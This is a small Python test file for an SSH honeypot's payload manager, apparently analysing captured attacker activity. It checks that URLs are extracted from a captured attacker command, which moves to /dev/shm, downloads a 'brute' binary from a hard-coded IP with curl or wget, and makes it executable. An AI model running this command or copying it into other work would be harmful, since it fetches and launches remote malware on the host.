import re

import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ssh_honeypot.core.payload_manager import PayloadManager
from ssh_honeypot.core.database import HoneyDB


def extract_urls(text):
    # Use real implementation
    # We can instantiate with None db as we only call extract_urls
    pm = PayloadManager(db=None)
    return pm.extract_urls(text)


def test_extraction():
    # The command from the screenshot
    text = 'cd /dev/shm; (curl -LO "194.163.133.186/f/brute/x86_64/.>_" || wget -k "194.163.133.186/f/brute/x86_64/.>_") ; chmod +x ...'

    print(f"Testing text: {text}")
    urls = extract_urls(text)
    print(f"Extracted URLs: {urls}")

    expected = "194.163.133.186/f/brute/x86_64/.>_"
    found = any(expected in u for u in urls)

    if found:
        print("SUCCESS: Found expected URL.")
    else:
        print("FAILURE: Did not find expected URL.")


if __name__ == "__main__":
    test_extraction()
